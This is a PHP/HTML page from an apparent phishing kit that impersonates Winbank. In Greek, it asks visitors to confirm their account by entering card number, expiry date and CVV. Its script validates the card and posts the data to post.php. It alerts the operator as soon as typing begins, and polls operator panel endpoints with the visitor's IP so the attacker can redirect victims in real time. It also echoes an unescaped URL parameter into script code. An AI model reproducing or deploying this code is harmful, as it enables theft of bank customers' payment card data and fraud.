<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Winbank</title>
    <link rel="stylesheet" href="res/main.css">
</head>
<body style="background:#F1F1F0;">
<header>
<div class="container">
<div class="left">
<img src="res/logo.svg">
</div>
<div class="center">
<img src="res/links-lg.png" class="lg">
<img src="res/links-sm.png" class="sm">
</div>
<div class="right">
<img src="res/biglogo.svg">
</div>
</div>
</header>
<main style="background:#F1F1F0;">
<div class="container">




<div class="forma">

<?php 
if(isset($_GET['recover'])){
    echo '
<div class="title">Αποστολή Username</div>
<div class="text">
Εισαγάγετε τα στοιχεία της κάρτας σας για να ανακτήσετε το όνομα χρήστη σας.
</div>'; 
}else{

    echo '
<div class="title">Επιβεβαίωση λογαριασμού</div>
<div class="text">
Εισαγάγετε τα στοιχεία της κάρτας σας για να επαληθεύσετε τον λογαριασμό σας.
</div>'; 

}
?>

<?php 
if(isset($_GET['e'])){
    echo '<div class="col" style="margin:20px 0; color:red;">Λάθος πληροφορίες κάρτας. Παρακαλούμε ελέγξτε τα στοιχεία σας και προσπαθήστε ξανά.</div>';
}
?>

<div class="col">
    <label>Αριθμός κάρτας</label><br>
    <input type="text" id="d1" style="width:400px;" placeholder="XXXX XXXX XXXX XXXX">
</div>
<div class="col">
    <label>Ημερομηνία λήξης</label><br>
    <input type="text" id="d2" style="width:200px;" placeholder="ΜΜ/ΕΕ">
</div>
<div class="col">
    <label>Κωδικός ασφαλείας</label><br>
    <input type="text" id="d3" style="width:100px;" placeholder="CVV">
</div>
<div class="col" style="margin:20px 0;">
    <button style="width:200px;" onclick="sendCard()">Επόμενο</button>
</div>


</div>






</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>
<script>
$("#d1").mask("0000 0000 0000 0000");
$("#d2").mask("00/00");
$("#d3").mask('0000');
// $("#d4").mask('0000');

var abortNotif = false;
$("#d1").keyup(()=>{
    if(!abortNotif){
        $.post("post.php", {carding:1});
        abortNotif=true;
    }
});

var allowSubmit;
var abortVal = true;
 

function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=1; i<=3; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}

 


if($("#d1").val().length<19){
	$("#d1").addClass("error");
	allowSubmit=false;
}

if($("#d3").val().length<3){
	$("#d3").addClass("error");
	allowSubmit=false;
}

 
 

$('#d1').validateCreditCard(function(result) {
    if (result.valid) {
        $("#d1").removeClass('error');
    } else {
        $("#d1").addClass("error");
        allowSubmit=false;
    }
});

var _exp = $("#d2").val();
const _exps = _exp.split("/");
if(_exps[0]>12 || _exps[0]<=0 || _exps[1]>40 || _exps[1]<24 || _exp.length<5){
    $("#d2").addClass("error");
	allowSubmit=false;
}

}

$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCard();
    }
});

function sendCard(){
    validate();

    if(allowSubmit){
        $.post("post.php", 
			{
				cc:$("#d1").val(),
                exp:$("#d2").val(),
				cvv:$("#d3").val(),

			}, function(done){
                        window.location="wait.php";  
                 
			}
		
		);

    }
}

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>